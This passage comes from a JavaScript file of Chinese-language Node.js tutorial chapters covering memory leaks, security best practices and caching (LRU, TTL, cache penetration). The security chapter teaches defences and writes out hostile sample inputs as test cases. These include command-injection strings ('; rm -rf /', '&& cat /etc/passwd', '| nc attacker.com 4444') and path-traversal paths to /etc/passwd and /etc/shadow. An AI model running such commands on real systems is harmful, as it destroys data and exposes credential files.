console.log("将 obj1 设为 null 后，缓存条目数:", normalCache.size);
console.log("（普通 Map 中的条目不会被自动清理——这是潜在的内存泄漏）");

// ✅ WeakMap 缓存：键被回收后，条目自动清理
const weakCache = new WeakMap();

function processWithWeakCache(obj) {
  if (weakCache.has(obj)) {
    return weakCache.get(obj);
  }
  const result = { processed: true, data: obj.name, time: Date.now() };
  weakCache.set(obj, result);
  return result;
}

// 使用 WeakMap 缓存
let obj3 = { name: "对象C", data: "x".repeat(1000) };
let obj4 = { name: "对象D", data: "x".repeat(1000) };
processWithWeakCache(obj3);
processWithWeakCache(obj4);

// WeakMap 无法直接获取 size（不可枚举）
console.log("WeakMap 缓存已设置（无法直接查看 size）");
console.log("obj3 缓存命中:", weakCache.has(obj3));  // true

obj3 = null;
// 注意：由于 GC 时机不确定，WeakMap 的条目可能不会立即被清理
// 但在下一次 GC 时会被自动清理
console.log("将 obj3 设为 null 后，WeakMap 会在 GC 时自动清理对应条目");

// ---- 7. 内存泄漏检测：模拟增长检测 ----
console.log("\\n===== 7. 内存泄漏检测：增长检测 =====");

// 模拟内存泄漏检测器
function createMemoryMonitor() {
  let lastHeapUsed = process.memoryUsage().heapUsed;
  const samples = [];

  return {
    sample() {
      const current = process.memoryUsage().heapUsed;
      const diff = current - lastHeapUsed;
      samples.push({
        heapUsed: (current / 1024 / 1024).toFixed(2) + " MB",
        diff: (diff / 1024).toFixed(2) + " KB",
        trend: diff > 1024 * 100 ? "⚠️ 增长" : "✅ 稳定",
      });
      lastHeapUsed = current;
    },
    getSamples() {
      return samples;
    },
    hasLeak() {
      // 简单判断：最近 3 次采样都增长超过 100KB
      const recent = samples.slice(-3);
      return recent.length === 3 && recent.every((s) => s.diff.startsWith("+") || parseFloat(s.diff) > 0.1);
    },
  };
}

const monitor = createMemoryMonitor();

// 模拟正常操作（不泄漏）
function normalOperation() {
  const data = [];
  for (let i = 0; i < 10000; i++) {
    data.push({ id: i, name: "item" + i });
  }
  return data.length;
}

normalOperation();
monitor.sample();

normalOperation();
monitor.sample();

normalOperation();
monitor.sample();

console.log("内存监控采样:");
console.table(monitor.getSamples());
console.log("是否检测到泄漏:", monitor.hasLeak() ? "是 ⚠️" : "否 ✅");

printMemory("程序结束");

// ---- 8. 内存泄漏修复清单 ----
console.log("\\n===== 8. 内存泄漏修复清单 =====");
const checklist = [
  "1. 检查全局变量：避免使用 global 或意外创建全局变量",
  "2. 检查闭包：确保闭包不持有对整个大对象的引用",
  "3. 检查事件监听器：使用 emitter.once() 或手动 emitter.off()",
  "4. 检查定时器：确保 clearInterval/clearTimeout 被调用",
  "5. 检查缓存：使用 WeakMap 或实现 LRU 淘汰策略",
  "6. 检查 Stream：确保流被正确关闭和销毁",
  "7. 检查 Promise：确保 Promise 链有适当的错误处理",
  "8. 定期监控：使用 process.memoryUsage() 监控内存趋势",
];
checklist.forEach((item) => console.log("  " + item));`,
  },

  // =========================================================
  // 第三章：安全最佳实践
  // =========================================================
  {
    id: "node-security",
    title: "安全最佳实践",
    icon: "🔒",
    group: "进阶实战补充",
    content: `## 为什么 Node.js 安全很重要？

Node.js 运行在服务端，拥有操作系统的完整访问权限（文件系统、网络、进程管理）。一个安全漏洞可能导致的后果包括：数据泄露、服务器被控制、用户隐私被侵犯。**安全不是事后的补丁，而是设计时就应考虑的要素**。

---

## 命令注入防护

命令注入（Command Injection）是攻击者通过输入构造恶意命令，在服务器上执行任意系统命令的攻击方式。

### 危险的代码模式

\`\`\`javascript
const { exec } = require('child_process');

// ❌ 极度危险：直接拼接用户输入到命令中
app.get('/ping', (req, res) => {
  const host = req.query.host;
  // 攻击者输入: 8.8.8.8; rm -rf /
  exec(\`ping -c 1 \${host}\`, (err, stdout) => {
    res.send(stdout);
  });
});
\`\`\`

### 防护策略

1. **避免使用 shell 执行命令**：使用 \`execFile\` 替代 \`exec\`，它不经过 shell 解析。
2. **参数化**：将用户输入作为参数传递，而非拼接到命令字符串中。
3. **输入验证**：对用户输入进行严格的格式验证（白名单验证）。
4. **最小权限原则**：以最低权限运行 Node.js 进程。

\`\`\`javascript
const { execFile } = require('child_process');

// ✅ 安全：execFile 直接执行命令，不经过 shell
app.get('/ping', (req, res) => {
  const host = req.query.host;
  // 验证 host 格式（只允许 IP 地址或域名格式）
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).send('Invalid host');
  }
  execFile('ping', ['-c', '1', host], (err, stdout) => {
    res.send(stdout);
  });
});
\`\`\`

---

## 路径遍历攻击（Path Traversal）

路径遍历攻击（也称为目录遍历）是攻击者通过构造特殊的文件路径（如 \`../../../etc/passwd\`），访问应用目录之外的敏感文件。

\`\`\`javascript
// ❌ 危险：直接拼接用户输入到文件路径
app.get('/file', (req, res) => {
  const filename = req.query.name;
  // 攻击者输入: ../../../etc/passwd
  const content = fs.readFileSync('./uploads/' + filename, 'utf8');
  res.send(content);
});
\`\`\`

### 防护策略

1. **使用 path.resolve 和 path.normalize 规范化路径**。
2. **验证规范化后的路径是否在允许的目录内**。
3. **使用白名单**限制可访问的文件。

\`\`\`javascript
const path = require('path');

// ✅ 安全：验证路径在允许的目录内
function safeReadFile(userFilename, baseDir, res) {
  const safePath = path.resolve(baseDir, userFilename);
  // 确保 safePath 在 baseDir 之内
  if (!safePath.startsWith(path.resolve(baseDir))) {
    return res.status(403).send('Access denied');
  }
  const content = fs.readFileSync(safePath, 'utf8');
  res.send(content);
}
\`\`\`

---

## CSRF（跨站请求伪造）

CSRF 攻击是指攻击者诱导用户访问一个恶意页面，该页面自动向用户已登录的网站发送请求，利用用户的登录状态执行非预期的操作。

**概念说明**：
- 用户登录了网站 A（如银行网站）。
- 用户访问了恶意网站 B。
- 网站 B 自动向网站 A 发送转账请求（利用浏览器自动携带 Cookie 的特性）。
- 网站 A 以为是用户本人操作，执行了转账。

**防护策略**：
1. **CSRF Token**：服务端生成随机 Token，嵌入表单，验证请求时检查 Token。
2. **SameSite Cookie**：设置 Cookie 的 \`SameSite\` 属性为 \`Strict\` 或 \`Lax\`。
3. **验证 Referer/Origin 头**：检查请求来源。
4. **双重提交 Cookie**：将 Token 同时放在 Cookie 和请求体中。

---

## CORS 配置

CORS（Cross-Origin Resource Sharing，跨域资源共享）是浏览器的一种安全机制，限制网页从不同源请求资源。

**不安全的配置**：

\`\`\`javascript
// ❌ 危险：允许所有来源
res.setHeader('Access-Control-Allow-Origin', '*');

// ❌ 危险：允许所有来源携带凭证
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
res.setHeader('Access-Control-Allow-Credentials', 'true');
\`\`\`

**安全配置原则**：
1. 使用白名单，不信任 \`req.headers.origin\`。
2. 只在需要时才允许携带凭证。
3. 限制允许的 HTTP 方法和请求头。

\`\`\`javascript
// ✅ 安全：使用白名单
const allowedOrigins = ['https://example.com', 'https://app.example.com'];
const origin = req.headers.origin;
if (allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
\`\`\`

---

## Helmet 概念

Helmet 是一个 Express 中间件集合，通过设置各种 HTTP 安全头来保护应用。它包含以下子中间件：

| 中间件 | 设置的头 | 作用 |
| --- | --- | --- |
| helmet.contentSecurityPolicy | Content-Security-Policy | 防止 XSS 和数据注入攻击 |
| helmet.crossOriginEmbedderPolicy | Cross-Origin-Embedder-Policy | 控制跨域资源加载 |
| helmet.crossOriginOpenerPolicy | Cross-Origin-Opener-Policy | 隔离跨域窗口 |
| helmet.crossOriginResourcePolicy | Cross-Origin-Resource-Policy | 控制跨域资源共享 |
| helmet.dnsPrefetchControl | X-DNS-Prefetch-Control | 控制 DNS 预解析 |
| helmet.expectCt | Expect-CT | 证书透明度 |
| helmet.frameguard | X-Frame-Options | 防止点击劫持 |
| helmet.hidePoweredBy | 移除 X-Powered-By | 隐藏服务器信息 |
| helmet.hsts | Strict-Transport-Security | 强制 HTTPS |
| helmet.ieNoOpen | X-Download-Options | 防止 IE 自动下载 |
| helmet.noSniff | X-Content-Type-Options | 防止 MIME 类型嗅探 |
| helmet.originAgentCluster | Origin-Agent-Cluster | 隔离代理集群 |
| helmet.permittedCrossDomainPolicies | X-Permitted-Cross-Domain-Policies | 控制跨域策略 |
| helmet.referrerPolicy | Referrer-Policy | 控制 Referer 信息 |
| helmet.xssFilter | X-XSS-Protection | 浏览器 XSS 过滤器 |

---

## 敏感信息管理

敏感信息（API 密钥、数据库密码、加密密钥等）绝不应该硬编码在代码中或提交到版本控制系统。

**最佳实践**：
1. **使用环境变量**：通过 \`process.env\` 读取敏感配置。
2. **使用 .env 文件**：本地开发使用 \`.env\`，但确保 \`.env\` 在 \`.gitignore\` 中。
3. **使用密钥管理服务**：AWS Secrets Manager、HashiCorp Vault 等。
4. **加密存储**：敏感数据在存储前加密。
5. **最小权限**：每个服务/组件只拥有完成任务所需的最小权限。

\`\`\`javascript
// ❌ 危险：硬编码密钥
const API_KEY = 'sk-1234567890abcdef';
const DB_PASSWORD = 'mysecretpassword';

// ✅ 安全：从环境变量读取
const API_KEY = process.env.API_KEY;
const DB_PASSWORD = process.env.DB_PASSWORD;

if (!API_KEY) {
  throw new Error('API_KEY 环境变量未设置');
}
\`\`\`

---

## 时序攻击（Timing Attack）

时序攻击是一种侧信道攻击，攻击者通过测量操作执行时间的差异来推断敏感信息。最常见的场景是字符串比较：如果使用 \`===\` 逐字符比较，第一个不匹配的字符会让比较提前结束，攻击者可以通过测量时间推断正确字符的位置。

\`\`\`javascript
// ❌ 易受时序攻击：字符串比较会在第一个不同字符处提前返回
function checkPassword(input, stored) {
  return input === stored;  // 逐字符比较，时间取决于前缀匹配长度
}
\`\`\`

**防护**：使用 \`crypto.timingSafeEqual()\` 进行常量时间比较：

\`\`\`javascript
const crypto = require('crypto');

// ✅ 安全：常量时间比较
function checkPassword(input, stored) {
  const inputBuf = Buffer.from(input);
  const storedBuf = Buffer.from(stored);
  // 注意：两个 Buffer 必须长度相同
  if (inputBuf.length !== storedBuf.length) {
    // 即使长度不同，也要做常量时间比较以防止长度泄露
    crypto.timingSafeEqual(inputBuf, Buffer.alloc(storedBuf.length));
    return false;
  }
  return crypto.timingSafeEqual(inputBuf, storedBuf);
}
\`\`\`

---

## ReDoS 防护（正则表达式拒绝服务）

ReDoS（Regular Expression Denial of Service）是指攻击者构造特殊的输入，使得正则表达式引擎进入"灾难性回溯"（Catastrophic Backtracking），导致 CPU 100% 占用。

### 灾难性回溯的原理

当正则表达式包含多个量词（\`*\`、\`+\`、\`{n,}\`）嵌套时，引擎可能需要在大量可能的路径中回溯，导致指数级的时间复杂度。

\`\`\`javascript
// ❌ 危险的正则：嵌套量词导致灾难性回溯
const dangerousRegex = /^(a+)+$/;
// 攻击者输入: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' (30个a + !)
// 匹配过程会尝试指数级数量的组合，导致 CPU 100%

// ❌ 另一个危险模式
const alsoDangerous = /^([a-zA-Z]+)*$/;
\`\`\`

### 防护策略

1. **简化正则表达式**：避免嵌套量词。
2. **使用非贪婪量词**：\`+?\` 替代 \`+\`。
3. **设置超时**：限制正则匹配的执行时间。
4. **使用安全的替代方案**：对简单场景使用字符串方法（\`indexOf\`、\`startsWith\` 等）。

\`\`\`javascript
// ✅ 安全：使用非贪婪量词或简化的正则
const safeRegex = /^a+$/;  // 去掉了嵌套量词

// ✅ 更安全：用字符串方法替代正则
function isAllA(str) {
  return str.length > 0 && str.split('').every(c => c === 'a');
}
\`\`\`

---

## 安全实践总结

| 安全领域 | 核心风险 | 防护措施 |
| --- | --- | --- |
| 命令注入 | 用户输入被当作命令执行 | execFile 替代 exec，输入验证 |
| 路径遍历 | 访问系统敏感文件 | 路径规范化 + 白名单验证 |
| CSRF | 跨站请求伪造 | CSRF Token，SameSite Cookie |
| XSS | 跨站脚本注入 | 输出编码，CSP 头 |
| 时序攻击 | 通过时间差推断信息 | crypto.timingSafeEqual |
| ReDoS | 正则回溯导致 CPU 100% | 简化正则，设置超时 |
| 敏感信息泄露 | 密钥硬编码或提交到仓库 | 环境变量，密钥管理服务 |
| 依赖漏洞 | 第三方库存在已知漏洞 | 定期 npm audit，更新依赖 |

下面这段代码演示了多种安全防护技术的实现。`,
    code: `// ============================================================
// 第三章代码演示：安全最佳实践
// ============================================================
const path = require("path");
const crypto = require("crypto");

// ---- 1. 路径遍历攻击与防护 ----
console.log("===== 1. 路径遍历攻击与防护 =====");

// 模拟安全的文件读取函数
function safeReadFile(userInput, baseDir) {
  // 步骤1：用 path.resolve 将用户输入解析为绝对路径
  const resolvedPath = path.resolve(baseDir, userInput);

  // 步骤2：规范化路径（处理 .. 和 .）
  const normalizedPath = path.normalize(resolvedPath);

  // 步骤3：验证规范化后的路径是否在允许的目录内
  const baseDirResolved = path.resolve(baseDir);
  if (!normalizedPath.startsWith(baseDirResolved + path.sep) && normalizedPath !== baseDirResolved) {
    return { success: false, error: "路径遍历攻击被阻止！", path: normalizedPath };
  }

  return { success: true, path: normalizedPath };
}

const baseDir = "/var/www/uploads";

// 正常请求
console.log("正常请求 'photo.jpg':");
console.log("  ", safeReadFile("photo.jpg", baseDir));

// 路径遍历攻击尝试
console.log("\\n攻击尝试 '../../../etc/passwd':");
console.log("  ", safeReadFile("../../../etc/passwd", baseDir));

// 另一个攻击尝试
console.log("\\n攻击尝试 '../../etc/shadow':");
console.log("  ", safeReadFile("../../etc/shadow", baseDir));

// 正常子目录访问
console.log("\\n正常子目录 'images/cat.jpg':");
console.log("  ", safeReadFile("images/cat.jpg", baseDir));

// ---- 2. 命令注入与防护 ----
console.log("\\n===== 2. 命令注入与防护 =====");

// 模拟命令执行函数
function safeExecCommand(userInput) {
  // 步骤1：白名单验证——只允许字母、数字、点、横线、下划线
  const safePattern = /^[a-zA-Z0-9.\\-_]+$/;
  if (!safePattern.test(userInput)) {
    return {
      success: false,
      error: "输入包含非法字符，可能是命令注入攻击！",
      blocked: true,
    };
  }

  // 步骤2：参数化——将用户输入作为参数传递，而非拼接到命令字符串
  return {
    success: true,
    command: "ping",
    args: ["-c", "1", userInput],
    message: "安全执行: ping -c 1 " + userInput,
  };
}

// 正常请求
console.log("正常请求 '8.8.8.8':");
console.log("  ", safeExecCommand("8.8.8.8"));

// 命令注入攻击尝试
console.log("\\n攻击尝试 '8.8.8.8; rm -rf /':");
console.log("  ", safeExecCommand("8.8.8.8; rm -rf /"));

// 另一个攻击尝试
console.log("\\n攻击尝试 '8.8.8.8 && cat /etc/passwd':");
console.log("  ", safeExecCommand("8.8.8.8 && cat /etc/passwd"));

// 管道符注入
console.log("\\n攻击尝试 '8.8.8.8 | nc attacker.com 4444':");
console.log("  ", safeExecCommand("8.8.8.8 | nc attacker.com 4444"));

// ---- 3. 时序攻击防护：crypto.timingSafeEqual ----
console.log("\\n===== 3. 时序攻击与 crypto.timingSafeEqual =====");

// ❌ 不安全的方式：使用 === 比较
function insecureCompare(a, b) {
  return a === b;
}

// ✅ 安全的方式：使用 timingSafeEqual
function secureCompare(a, b) {
  const aBuf = Buffer.from(String(a));
  const bBuf = Buffer.from(String(b));

  // timingSafeEqual 要求两个 Buffer 长度相同
  if (aBuf.length !== bBuf.length) {
    // 为防止泄露长度信息，仍然进行常量时间比较
    // 创建一个与 aBuf 等长的随机 Buffer 进行比较
    const randomBuf = crypto.randomBytes(aBuf.length);
    crypto.timingSafeEqual(aBuf, randomBuf);
    return false;
  }

  return crypto.timingSafeEqual(aBuf, bBuf);
}

// 测试比较
const secretToken = "abc123xyz_secret_token_456";

console.log("正确 token 比较:");
console.log("  不安全 ===     :", insecureCompare(secretToken, secretToken));
console.log("  安全 timingSafe:", secureCompare(secretToken, secretToken));

console.log("\\n错误 token 比较:");
console.log("  不安全 ===     :", insecureCompare("wrong", secretToken));
console.log("  安全 timingSafe:", secureCompare("wrong", secretToken));

// 演示时序攻击原理
console.log("\\n时序攻击原理演示:");
console.log("  === 比较: 逐字符比较，第一个不匹配的字符让比较提前结束");
console.log("  timingSafeEqual: 比较所有字符，时间恒定，无法通过时间推断信息");

// 模拟测量比较时间
function measureCompareTime(fn, a, b, iterations) {
  const start = performance.now();
  for (let i = 0; i < iterations; i++) {
    fn(a, b);
  }
  return performance.now() - start;
}

const tokens = [
  "aaaaa",
  "aaaab",
  "aaaac",
  "zzzzz",
];

console.log("\\n不同前缀匹配度的时间对比（=== 不安全方式）:");
const insecureTimes = tokens.map((t) => ({
  token: t,
  "时间(ms)": measureCompareTime(insecureCompare, "aaaaa", t, 1000000).toFixed(2),
  "前缀匹配": t[0] === "a" ? "部分匹配" : "不匹配",
}));
console.table(insecureTimes);
console.log("注意：前缀匹配的 token 耗时可能不同，这是时序攻击的信息来源");

console.log("\\n不同前缀匹配度的时间对比（timingSafeEqual 安全方式）:");
const secureTimes = tokens.map((t) => ({
  token: t,
  "时间(ms)": measureCompareTime(secureCompare, "aaaaa", t, 1000000).toFixed(2),
  "前缀匹配": t[0] === "a" ? "部分匹配" : "不匹配",
}));
console.table(secureTimes);
console.log("timingSafeEqual 的时间与输入无关，攻击者无法获取信息");

// ---- 4. ReDoS 防护 ----
console.log("\\n===== 4. ReDoS 与防护 =====");

// ❌ 危险的正则表达式（嵌套量词）
const dangerousRegex = /^(a+)+$/;

// ✅ 安全的正则表达式（去掉嵌套量词）
const safeRegex = /^a+$/;

// ✅ 更安全：使用字符串方法
function isAllAString(str) {
  if (str.length === 0) return false;
  for (let i = 0; i < str.length; i++) {
    if (str[i] !== "a") return false;
  }
  return true;
}

// 测试正常输入
console.log("正常输入测试:");
const normalInput = "aaaa";
console.log("  输入:", normalInput);
console.log("  危险正则:", dangerousRegex.test(normalInput));
console.log("  安全正则:", safeRegex.test(normalInput));
console.log("  字符串方法:", isAllAString(normalInput));

// 测试潜在的 ReDoS 输入
console.log("\\n潜在 ReDoS 输入测试:");
const redosInput = "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!";
console.log("  输入:", redosInput, "(长度:", redosInput.length + ")");

const redosStart = performance.now();
const redosResult = dangerousRegex.test(redosInput);
const redosTime = performance.now() - redosStart;
console.log("  危险正则结果:", redosResult, "| 耗时:", redosTime.toFixed(3), "ms");
if (redosTime > 10) {
  console.log("  ⚠️ 警告：危险正则耗时超过 10ms！这就是 ReDoS 攻击的效果！");
}

const safeStart = performance.now();
const safeResult = safeRegex.test(redosInput);
const safeTime = performance.now() - safeStart;
console.log("  安全正则结果:", safeResult, "| 耗时:", safeTime.toFixed(3), "ms");

const strStart = performance.now();
const strResult = isAllAString(redosInput);
const strTime = performance.now() - strStart;
console.log("  字符串方法结果:", strResult, "| 耗时:", strTime.toFixed(3), "ms");

// 演示 ReDoS 防护：正则超时模拟
console.log("\\nReDoS 防护策略:");
console.log("  1. 避免嵌套量词——/^(a+)+$/ 改为 /^a+$/");
console.log("  2. 对简单场景使用字符串方法（indexOf, startsWith 等）");
console.log("  3. 限制输入长度——在正则匹配前先检查长度");
console.log("  4. 在生产环境中使用 re2 或 safe-regex 等安全库");

// ---- 5. 输入验证与净化 ----
console.log("\\n===== 5. 输入验证与净化 =====");

// 通用输入验证器
const validators = {
  // 验证邮箱格式
  email(input) {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
    return emailRegex.test(input);
  },

  // 验证是否为纯数字
  numeric(input) {
    return /^\\d+$/.test(String(input));
  },

  // 验证是否为合法 URL
  url(input) {
    try {
      new URL(input);
      return true;
    } catch {
      return false;
    }
  },

  // 验证是否为安全的文件名（无路径分隔符）
  safeFilename(input) {
    // 不允许路径分隔符和特殊字符
    return /^[a-zA-Z0-9._-]+$/.test(input) && !input.includes("..");
  },

  // 验证长度限制
  maxLength(input, max) {
    return String(input).length <= max;
  },
};

// 测试输入验证
const testCases = [
  { input: "user@example.com", validator: "email", expected: true },
  { input: "not-an-email", validator: "email", expected: false },
  { input: "12345", validator: "numeric", expected: true },
  { input: "abc123", validator: "numeric", expected: false },
  { input: "https://example.com", validator: "url", expected: true },
  { input: "javascript:alert(1)", validator: "url", expected: false },
  { input: "photo.jpg", validator: "safeFilename", expected: true },
  { input: "../../../etc/passwd", validator: "safeFilename", expected: false },
  { input: "short", validator: "maxLength:10", expected: true },
  { input: "this-is-too-long-string", validator: "maxLength:10", expected: false },
];

console.log("输入验证结果:");
console.table(
  testCases.map((tc) => {
    let result;
    if (tc.validator.startsWith("maxLength:")) {
      const max = parseInt(tc.validator.split(":")[1]);
      result = validators.maxLength(tc.input, max);
    } else {
      result = validators[tc.validator](tc.input);
    }
    return {
      输入: tc.input.slice(0, 25),
      验证器: tc.validator,
      结果: result,
      预期: tc.expected,
      通过: result === tc.expected ? "✅" : "❌",
    };
  })
);

// ---- 6. 敏感信息环境变量管理 ----
console.log("\\n===== 6. 敏感信息管理 =====");

// 模拟从环境变量读取敏感信息
function loadConfig() {
  const config = {
    // 从环境变量读取，提供默认值（仅用于开发）
    databaseUrl: process.env.DATABASE_URL || "(未设置 DATABASE_URL)",
    apiKey: process.env.API_KEY || "(未设置 API_KEY)",
    jwtSecret: process.env.JWT_SECRET || "(未设置 JWT_SECRET)",
    nodeEnv: process.env.NODE_ENV || "development",
  };

  // 验证必需的环境变量
  const required = ["DATABASE_URL", "API_KEY", "JWT_SECRET"];
  const missing = required.filter((key) => !process.env[key]);

  return { config, missing };
}

const { config, missing } = loadConfig();
console.log("当前配置:");
console.table(config);
if (missing.length > 0) {
  console.log("⚠️ 缺少必需的环境变量:", missing.join(", "));
  console.log("  请设置: export " + missing[0] + "=your_value");
} else {
  console.log("✅ 所有必需的环境变量已设置");
}

// 模拟敏感信息泄露风险
console.log("\\n敏感信息管理最佳实践:");
console.log("  1. 绝不在代码中硬编码密钥");
console.log("  2. 使用环境变量存储敏感信息");
console.log("  3. .env 文件必须加入 .gitignore");
console.log("  4. 使用密钥管理服务（AWS Secrets Manager 等）");
console.log("  5. 定期轮换密钥和凭证");
console.log("  6. 遵循最小权限原则");

// ---- 7. 安全总结 ----
console.log("\\n===== 7. 安全实践总结 =====");
const securitySummary = {
  "命令注入": "使用 execFile 替代 exec，白名单验证输入",
  "路径遍历": "path.resolve + 验证路径在允许的目录内",
  "时序攻击": "使用 crypto.timingSafeEqual 常量时间比较",
  "ReDoS": "避免嵌套量词，限制输入长度",
  "输入验证": "所有用户输入都需要验证和净化",
  "敏感信息": "环境变量管理，不硬编码密钥",
  "CSRF": "CSRF Token + SameSite Cookie",
  "CORS": "白名单验证 origin，不信任 *",
};
console.table(Object.entries(securitySummary).map(([key, val]) => ({ 威胁: key, 防护措施: val })));`,
  },

  // =========================================================
  // 第四章：缓存策略
  // =========================================================
  {
    id: "node-caching",
    title: "缓存策略",
    icon: "🗄️",
    group: "进阶实战补充",
    content: `## 为什么需要缓存？

在现代 Web 应用中，缓存是提升性能最有效的手段之一。一次数据库查询可能需要 10-100ms，一次网络请求可能需要 100-500ms，而从内存缓存中读取数据只需要不到 1ms。**缓存的核心思想是：用空间换时间，把频繁访问的数据存储在更快的存储介质中**。

---

## 缓存层次

从离用户最近到最远，缓存的层次结构如下：

| 层次 | 位置 | 访问速度 | 典型用途 |
| --- | --- | --- | --- |
| **L1：应用内存缓存** | 进程内存（Map/对象） | < 1ms | 配置数据、计算结果 |
| **L2：分布式缓存** | Redis / Memcached | 1-5ms | 会话数据、热点数据 |
| **L3：数据库查询缓存** | MySQL Query Cache | 随数据库 | 频繁查询结果 |
| **L4：CDN 缓存** | 边缘节点 | 10-50ms | 静态资源 |
| **L5：浏览器缓存** | 用户浏览器 | < 1ms | 静态资源、API 响应 |

在 Node.js 中，我们主要关注 **L1（应用内存缓存）** 和 **L2（分布式缓存）** 两个层次。

---

## 缓存策略（Cache Strategies）

### 1. Cache-Aside（旁路缓存）—— 最常用

应用先查缓存，缓存未命中时查数据库，然后将结果写入缓存。

\`\`\`
读取流程：
  1. 查缓存 → 命中 → 返回
  2. 查缓存 → 未命中 → 查数据库 → 写入缓存 → 返回

写入流程：
  1. 更新数据库 → 删除缓存（或更新缓存）
\`\`\`

**优点**：实现简单，缓存与数据库解耦。
**缺点**：首次请求总是未命中，需要处理缓存穿透。

### 2. Read-Through（读穿透）

缓存作为数据库的代理，应用只与缓存交互。缓存未命中时，缓存自己负责从数据库加载数据。

\`\`\`
读取流程：
  1. 应用 → 查缓存 → 缓存命中 → 返回
  2. 应用 → 查缓存 → 缓存未命中 → 缓存查数据库 → 缓存存储 → 返回
\`\`\`

**优点**：应用代码更简洁，只需与缓存交互。
**缺点**：缓存实现更复杂，需要感知数据库。

### 3. Write-Through（写穿透）

应用写入缓存时，缓存同步写入数据库。保证缓存与数据库一致。

\`\`\`
写入流程：
  1. 应用 → 写缓存 → 缓存同步写数据库 → 返回成功
\`\`\`

**优点**：数据一致性强。
**缺点**：写入延迟较高（需要等数据库写入完成）。

### 4. Write-Behind（写回）

应用写入缓存后立即返回，缓存异步批量写入数据库。

\`\`\`
写入流程：
  1. 应用 → 写缓存 → 立即返回成功
  2. 缓存 → 异步批量写数据库
\`\`\`

**优点**：写入延迟极低。
**缺点**：缓存宕机时可能丢失数据。

---

## 缓存失效策略

缓存空间有限，需要在缓存满时淘汰一些数据。常见的淘汰策略：

### TTL（Time To Live）—— 基于时间的过期

每个缓存条目设置一个过期时间，到期后自动失效。

\`\`\`javascript
// TTL 缓存条目的结构
{
  value: "缓存的数据",
  expireAt: 1710000000000  // 过期时间戳
}
\`\`\`

**优点**：实现简单，适合有时间窗口的数据。
**缺点**：可能在过期瞬间产生大量缓存未命中（缓存雪崩）。

### LRU（Least Recently Used）—— 最近最少使用

当缓存满时，淘汰最久没有被访问的数据。核心思想：**如果一个数据最近被访问过，那么它将来被访问的概率也更高**。

LRU 通常用**哈希表 + 双向链表**实现：
- 哈希表：O(1) 查找
- 双向链表：O(1) 移动节点到头部（标记为最近使用）

### LFU（Least Frequently Used）—— 最不经常使用

当缓存满时，淘汰访问频率最低的数据。核心思想：**访问频率高的数据应该保留**。

**LRU vs LFU 对比**：

| 特性 | LRU | LFU |
| --- | --- | --- |
| 淘汰依据 | 最近访问时间 | 访问频率 |
| 适合场景 | 热点数据经常变化 | 热点数据相对稳定 |
| 新数据 | 不会被立刻淘汰 | 可能因频率低被淘汰 |
| 实现复杂度 | 中等 | 较高 |
| 历史数据 | 不关心 | 关心历史访问次数 |

---

## 缓存三大问题

### 1. 缓存穿透（Cache Penetration）

**定义**：查询一个**不存在**的数据，由于缓存中没有，请求会穿透到数据库。如果大量请求查询不存在的数据，数据库压力会骤增。

**场景**：攻击者不断请求 \`/user/99999\`（ID 不存在），每次都绕过缓存直接打到数据库。

**解决方案**：
- **布隆过滤器**：在缓存前加一层布隆过滤器，快速判断数据是否存在。
- **缓存空值**：对不存在的数据也缓存一个空值（设置较短的 TTL）。
- **参数校验**：在业务层校验请求参数的合法性。

### 2. 缓存击穿（Cache Breakdown）

**定义**：一个**热点数据**的缓存过期，大量并发请求同时落到数据库。

**场景**：某个热门商品的缓存刚好过期，瞬间有 1000 个请求同时查数据库获取这个商品信息。

**解决方案**：
- **互斥锁（Mutex）**：同一时间只允许一个请求去查数据库，其他请求等待。
- **"永不过期"**：对热点数据不设置过期时间，通过后台任务异步更新。
- **提前预热**：在缓存过期前，提前异步刷新缓存。

### 3. 缓存雪崩（Cache Avalanche）

**定义**：**大量缓存同时过期**，导致所有请求都打到数据库，数据库压力骤增甚至宕机。

**场景**：所有缓存的过期时间都设置为 1 小时，在整点时刻大量缓存同时过期。

**解决方案**：
- **过期时间随机化**：在基础 TTL 上增加一个随机偏移量，避免同时过期。
- **多级缓存**：使用多级缓存（如本地缓存 + 分布式缓存），降低单点风险。
- **限流降级**：在数据库层面做限流，超出限制的请求直接返回降级数据。
- **高可用架构**：数据库主从、读写分离、集群部署。

\`\`\`javascript
// 过期时间随机化示例
const baseTTL = 3600; // 1 小时
const randomOffset = Math.floor(Math.random() * 600); // 0-10 分钟随机偏移
const actualTTL = baseTTL + randomOffset;
\`\`\`

---

## LRU 缓存实现详解

LRU 的核心数据结构是**哈希表 + 双向链表**：

- **哈希表**（Map/Object）：存储 key → 链表节点的映射，实现 O(1) 查找。
- **双向链表**：维护访问顺序，头部是最近使用的，尾部是最久未使用的。

**操作流程**：
- **get(key)**：查找哈希表，找到后将节点移到链表头部，返回值。
- **put(key, value)**：如果 key 已存在，更新值并移到头部；如果缓存已满，删除链表尾部节点后插入新节点。
- **淘汰**：链表尾部节点就是最久未使用的，删除它。

下面这段代码演示了 LRU 缓存、TTL 缓存、缓存策略对比，以及缓存击穿防护。`,
    code: `// ============================================================
// 第四章代码演示：缓存策略
// ============================================================

// ---- 1. LRU 缓存实现 ----
console.log("===== 1. LRU 缓存实现 =====");

class LRUCache {
  constructor(capacity) {
    this.capacity = capacity;
    this.cache = new Map(); // Map 保持插入顺序，适合实现 LRU
  }

  get(key) {
    if (!this.cache.has(key)) {
      return -1; // 未命中
    }
    // 将访问的 key 移到最新位置
    const value = this.cache.get(key);
    this.cache.delete(key);
    this.cache.set(key, value);
    return value;
  }

  put(key, value) {
    // 如果 key 已存在，先删除
    if (this.cache.has(key)) {
      this.cache.delete(key);
    }
    // 如果缓存已满，删除最旧的条目（Map 的第一个条目）
    else if (this.cache.size >= this.capacity) {
      const oldestKey = this.cache.keys().next().value;
      this.cache.delete(oldestKey);
    }
    // 插入新条目
    this.cache.set(key, value);
  }

  size() {
    return this.cache.size;
  }

  has(key) {
    return this.cache.has(key);
  }

  keys() {
    return [...this.cache.keys()];
  }

  clear() {
    this.cache.clear();
  }
}

// 测试 LRU 缓存
const lru = new LRUCache(3);
console.log("创建容量为 3 的 LRU 缓存");

lru.put("a", 1);
lru.put("b", 2);
lru.put("c", 3);
